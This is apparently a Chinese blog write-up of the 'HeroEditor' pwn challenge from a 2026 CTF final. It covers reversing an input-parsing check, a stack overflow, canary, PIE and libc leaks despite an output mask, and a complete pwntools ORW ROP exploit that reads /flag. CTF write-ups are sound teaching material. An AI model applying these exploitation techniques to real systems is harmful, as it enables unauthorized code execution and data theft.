---
title: 2026长城杯决赛PWN-HeroEditor
date: 2026-04-30 00:19:21
cover: ../static/2026ccb-final-HeroEditor/cover.webp
categories:
    - ctf
    - pwn
tags:
    - all
---

本题目为刚刚结束的长城杯决赛的一道pwn题目，笔者作为Del0n1x队伍pwn手参与，这题在赛场看了很久没解出来，赛后在晚上和队友在福州民宿爽吃福鼎肉片的时候突然想到了泄露栈地址的办法，最后弄了出来。
记得这题最后也就3、4解的样子好像，记不太清了但是确实没啥人解出来，分数标的300，这次决赛题目确实有点难了呃呃。

这道题目给了二进制文件、libc、ld，可以本地patch链接一下调试。checksec为保护全开，libc版本为2.39
首先逆向程序看看功能。

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(0x3Cu);
  banner();
  sandbox();
  vuln();
}
```
程序开了沙箱
![sandbox](source/static/2026ccb-final-HeroEditor/1.png)

```c
void __noreturn vuln()
{
  unsigned __int64 v0; // [rsp+8h] [rbp-8h]
  void *retaddr; // [rsp+18h] [rbp+8h]

  _cyg_profile_func_enter(vuln, retaddr);
  while ( 1 )
  {
    menu();
    v0 = getNum();
    if ( v0 == 3 )
    {
      puts("Goodbye, archivist.");
      _exit(0);
    }
    if ( v0 > 3 )
    {
LABEL_10:
      puts("Unknown command.");
    }
    else if ( v0 == 1 )
    {
      draft();
    }
    else
    {
      if ( v0 != 2 )
        goto LABEL_10;
      rules();
    }
  }
}
```
首先与程序交互就是一个坎，这里的getNum里面有个convert来check了我们的输入。
简单说我们的输入表示浮点数字符串，然后程序做了解析，还要过check1和check2，check2貌似很容易过，笔者没太注意了。check1要求我们转换后的整数数字不能包含输入的浮点字符串中的字符。另外输入黑名单了“x”符号，但是可以大写“X”绕过，依然可以使用十六进制。
此外我们还可以使用小数点、科学计数法，另外赛场上队友Swizzer说还支持0x1p?，这里p？表示数字要再乘以2的？次幂。
```c
unsigned __int64 __fastcall convert(const char *a1, unsigned __int64 *a2)
{
  double v2; // xmm0_8
  __int64 v4; // [rsp+1Ch] [rbp-224h]
  unsigned __int64 v5; // [rsp+20h] [rbp-220h]
  unsigned __int8 s[256]; // [rsp+30h] [rbp-210h] BYREF
  char v7[264]; // [rsp+130h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+238h] [rbp-8h]
  __int64 retaddr; // [rsp+248h] [rbp+8h]

  v8 = __readfsqword(0x28u);
  _cyg_profile_func_enter(convert, retaddr);
  *a2 = 0;
  memset(s, 0, sizeof(s));
  memset(v7, 0, 0x100u);
  v4 = (unsigned int)strlen(a1);
  if ( (int)v4 > 19 )
    LODWORD(v4) = 19;
  memcpy(s, a1, (int)v4);
  if ( !strchr((const char *)s, 'x') )
  {
    v2 = strtod((const char *)s, 0);
    if ( v2 >= 9.223372036854776e18 )
      v5 = (unsigned int)(int)(v2 - 9.223372036854776e18) ^ 0x8000000000000000LL;
    else
      v5 = (unsigned int)(int)v2;
    sprintf(v7, "%ld", v5);
    if ( (unsigned __int8)check1(s, v7) == 1 && !(unsigned __int8)check2(s, v5) )
      *a2 = v5;
  }
  _cyg_profile_func_exit((__int64)convert, retaddr);
  return v8 - __readfsqword(0x28u);
}
```
最终笔者摸索出来了正确交互的几个输入格式：
```
0->0
0X0.7p2->1
0X6p3->0x30
0X7p3->0x38
0X1cp3->0xe8
```
到现在我们可以和程序正常交互了。
程序的最明显的漏洞就是在draft功能的栈溢出
```c
unsigned __int64 draft()
{
  _BYTE s[24]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
  void *retaddr; // [rsp+28h] [rbp+8h]

  v2 = __readfsqword(0x28u);
  _cyg_profile_func_enter(draft, retaddr);
  puts("\n[Chronicle Draft]");
  printf("Draft size: ");
  size = getNum();
  if ( size && (unsigned __int64)size <= 0xE8 )
  {
    memset(s, 0, 0x10u);
    puts("Write your draft:");
    getContent(s, size);
    printf("Preview bytes: ");
    preview_size = getNum();
    if ( (unsigned __int64)preview_size <= 0x30 )
    {
      puts("Archive preview:");
      if ( preview_size )
        writeContent(s, preview_size);
      preview_size = 0;
      size = 0;
      puts("\nThe scribes seal the draft.");
    }
    else
    {
      puts("That preview would damage the parchment.");
    }
  }
  else
  {
    puts("The guild rejects that draft size.");
  }
  _cyg_profile_func_exit(draft, retaddr);
  return v2 - __readfsqword(0x28u);
}
```
局部数组s有栈溢出，最多输入长度0xe8，此外还可以读取栈上数据，可以读0x30，但是也有限制的，这里也是难住大部分选手的地方吧可能
```c
__int64 __fastcall writeContent(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 i; // [rsp+10h] [rbp-20h]
  size_t n; // [rsp+18h] [rbp-18h]
  void *retaddr; // [rsp+38h] [rbp+8h]

  _cyg_profile_func_enter(writeContent, retaddr);
  for ( i = 0; i < a2; i += n )
  {
    n = a2 - i;
    if ( a2 - i > 8 )
      n = 8;
    if ( (unsigned __int8)writeCheck(a1 + i) )
      write(1, &rodata_null, n);
    else
      write(1, (const void *)(a1 + i), n);
  }
  return _cyg_profile_func_exit(writeContent, retaddr);
}
```
这里输出按照8个字节为单位，每次都要writecheck，过不了就只输出rodata段上的8个空字节，相当于mask了一部分栈上的数据不可以泄露
```c
__int64 __fastcall sub_1320(__int64 a1)
{
  bool v1; // al
  unsigned int v2; // ebx
  __int64 retaddr; // [rsp+38h] [rbp+8h]

  _cyg_profile_func_enter(sub_1320, retaddr);
  v1 = !__PAIR16__(BYTE6(a1), HIBYTE(a1)) && BYTE5(a1) > 0x6Fu;
  v2 = v1;
  _cyg_profile_func_exit((__int64)sub_1320, retaddr);
  return v2;
}
```
这个check也比较好理解，就是针对栈地址和libc地址的，这俩地址在栈上不能输出，值得注意的是这里canary可以泄露。
（或许有办法可以写入栈内存的高两字节，把libc地址污染为8字节数据，应该也能输出，笔者没试，应该是如此）
经过实测，这0x30的栈数据泄露可以给我们canary和pie。接下来就是想办法拿栈和libc地址，之后就可以打ret2libc的orw了。
因为pie地址已知，如果我们在劫持控制流时rdi可以是指向栈地址或者libc地址的指针，就可以直接劫持到puts@plt来泄露，但问题是这条路貌似也被堵了，值得注意的是很多函数在退出时执行了_cyg_profile_func_exit

```c
__int64 __fastcall _cyg_profile_func_exit(__int64 a1, __int64 a2)
{
  __int64 vars0; // [rsp+20h] [rbp+0h]

  if ( !vars0 )
    error(a1, a2);
  sub_1278(vars0 + 8);
  return clear(vars0 + 8, a2);
}
__int64 __fastcall sub_1278(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  if ( (a1 & 0xFF0000000000LL) != 0x7F0000000000LL || (result = a1 & 7, (a1 & 7) != 0) )
    error(a1, a2);
  return result;
}
```
```
.text:00000000000012B8 ; __int64 __fastcall clear(_QWORD, _QWORD)
.text:00000000000012B8 clear           proc near               ; CODE XREF: __cyg_profile_func_exit+34↓p
.text:00000000000012B8 ; __unwind {
.text:00000000000012B8                 push    rbp
.text:00000000000012B9                 mov     rbp, rsp
.text:00000000000012BC                 xor     eax, eax
.text:00000000000012BE                 xor     edi, edi
.text:00000000000012C0                 xor     esi, esi
.text:00000000000012C2                 xor     edx, edx
.text:00000000000012C4                 xor     ecx, ecx
.text:00000000000012C6                 xor     r8d, r8d
.text:00000000000012C9                 xor     r9d, r9d
.text:00000000000012CC                 xor     r10d, r10d
.text:00000000000012CF                 xor     r11d, r11d
.text:00000000000012D2                 nop
.text:00000000000012D3                 pop     rbp
.text:00000000000012D4                 retn
.text:00000000000012D4 ; } // starts at 12B8
.text:00000000000012D4 clear           endp
```
这个hook函数有两个作用，一个是封死我们的栈迁移到pie-bss，也就是check了rbp得是第六字节为0x7f，然后得0x8对齐的，不然直接error
还有就是有一个clear，这个函数执行后我们能利用的寄存器基本都被清空了，直接堵死。

程序本身没有啥控制rdi的gadget，思路很自然地要想怎么能拿到一个脏的寄存器上下文。ida可以看到rules函数和menu函数都是只是输出了一些信息，没有其他操作，也没有这个特殊的exit的hook检查，因此它们的栈帧上下文应该就是脏的，经过调试，果然如此：
menu的栈帧rdi包含一个多重栈地址指针，因此可以被用于泄露栈地址（rules不行，可能是menu里面最后有个printf导致的，原来这竟然是伏笔吗？）
![menu-stack](source/static/2026ccb-final-HeroEditor/2.png)

这一步感觉会是难住绝大部分选手的点，这步过了后面泄露libc就简单了，直接劫持到pie+0x148c来write就行，rbp可以自己控制来设置好rbp-0x18的值，表示write的大小，然后check过不了直接打印rodata的数据，一直往后泄露到got就可以了
拿到libc之后就打orw。
值得一提的是rdx寄存器无法直接控制，笔者自己找了个magic gadget，借助rbx转一下即可
```python
pop_rbx = libc_base+0x586e4
pop_rdx = libc_base+0xb0153
# 0x00000000000b0153 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
```

完整exp脚本如下：
```python

#============coded by Keyboard===========

#============import some packages
from pwn import *
from Crypto.Util.number import *

#=============set some envs
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-l', '85']

#=============load libc and the binary file
libc = ELF('./libc.so.6')
binary = ELF('./pwn')

#=============start the process
# r = remote()
r = process('./pwn')
# r = gdb.debug('./pwn','''b *$rebase(0x204e)

#               ''')

#=============define some global vals
libc_base=None
pie_base=None
heap_leek=None

#=============define some utils
def i2b(x):
    #int to bytes
    #like: 2-> b'2'   0x100->b'256'
    return str(x).encode()
def get_libc_base(offset):
    global libc_base
    leek = r.recvuntil(b'\x7f')[-6:][::-1]
    libc_base = bytes_to_long(leek)-offset

#=============define some functions
def draft(size,content,size2):
    r.recvuntil(b'> ')
    r.sendline(b'0X0.7p2')
    r.recvuntil(b'Draft size: ')
    r.sendline(size)
    r.recvuntil(b'Write your draft:')
    r.send(content)
    r.recvuntil(b'Preview bytes: ')
    r.sendline(size2)
def f():
    r.recvuntil(b'>')
    r.sendline(b'2.0')

def exit1():
    r.recvuntil(b'>')
    r.sendline(b'3.0')
    r.recvuntil(b'Chest nunmber:\n>')



#========================the exp=======================

draft(b'0X0.7p2',b'\x00',b'0X6p3')
r.recvuntil(b'\x00'*0x18)
canary = r.recv(8)[::-1]
canary = bytes_to_long(canary)
print('canary is ',hex(canary))
r.recv(8)
pie_base = r.recv(8)[::-1]
pie_base = bytes_to_long(pie_base)-0x21bd
print('pie is ',hex(pie_base))
bss = pie_base+0x5100
draft_addr = pie_base+0x1f8d
draft_addr_no_push = pie_base+0x1f95
vuln = pie_base+0x2166
ret = pie_base+0x2165
#pie_base+0x7190+0x18
payload = b'a'*0x18+p64(canary)+p64(0)+p64(ret)+p64(draft_addr)+p64(pie_base+binary.plt['puts'])*6+p64(ret)+p64(vuln)+p64(0x2000)*5+p64(vuln)*9
draft(b'0X1cp3',payload,b'0')
payload = b'a'*0x18+p64(canary)+p64(0)+p64(pie_base+0x19fb)+p64(ret)+p64(pie_base+0x1233)
# draft(b'0X8p3',payload,b'0')
# draft(b'0X3.8p2',b'a'*0xe,b'0X6p3')
# pause()
# gdb.attach(r,'b *$rebase(0x204e)')
# payload = b'a'*0x18+p64(canary)+p64(0)+p64(draft)+p64(pie_base+0x148c)
r.recvuntil(b'Draft size: ')
r.sendline(b'0X8p3')
r.recvuntil(b'Write your draft:')
r.send(payload)
r.recvuntil(b'Preview bytes: ')
r.sendline(b'0')


stack_leek = r.recvuntil(b'\x7f')[-6:][::-1]
stack_leek = bytes_to_long(stack_leek)
environ = stack_leek+0x300
print('environ is ',hex(environ))

write_gadget = pie_base+0x148c
payload = b'b'*0x18+p64(canary)+p64(environ-0xf0)+p64(write_gadget)
draft(b'0X6p3',payload,b'0')
r.recvuntil(p64(pie_base+0x5008))
# r.recv(binary.got['puts']-0x3270)
r.recv(0x30)
libc_leek = r.recv(8)[::-1]
libc_leek = bytes_to_long(libc_leek)
print('libc_leek is ',hex(libc_leek))
libc_base = libc_leek-libc.symbols['_IO_2_1_stderr_']
print('libc_base is ',hex(libc_base))

pop_rdi = libc_base+0x10f78b
pop_rsi = libc_base+0x110a7d
pop_rbx = libc_base+0x586e4
pop_rdx = libc_base+0xb0153
# 0x00000000000b0153 : mov rdx, rbx ; pop rbx ; pop r12 ; pop rbp ; ret
open_addr = libc_base+libc.symbols['open']
read_addr = libc_base+libc.symbols['read']
write_addr = libc_base+libc.symbols['write']






payload = b'c'*0x18+p64(canary)+p64(environ-0xf0)
payload += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(environ-0xa8)+p64(pop_rbx)+p64(0x200)+p64(pop_rdx)+p64(0)*3+p64(read_addr)+p64(0xdeadbeef)
payload = payload.ljust(0xe8,b'\x00')
draft(b'0X1cp3',payload,b'0')
rop_addr = environ-0xa8
print('rop addr is ',hex(rop_addr))
# payload = b'c'*0x18+p64(canary)+p64(environ-0xf0)
payload = p64(pop_rdi)+p64(rop_addr+0x180)+p64(pop_rsi)+p64(0)+p64(open_addr)
payload +=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(rop_addr+0x300)+p64(pop_rbx)+p64(0x200)+p64(pop_rdx)+p64(0)*3+p64(read_addr)
payload +=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(rop_addr+0x300)+p64(pop_rbx)+p64(0x200)+p64(pop_rdx)+p64(0)*3+p64(write_addr)
payload = payload.ljust(0x180,b'\x00')
payload +=b'/flag\x00'
payload = payload.ljust(0x200,b'\x00')
r.send(payload)
# draft(b'0X1cp3',payload,b'0')

#==============turn to interactive
r.interactive()

```
![result](source/static/2026ccb-final-HeroEditor/3.png)


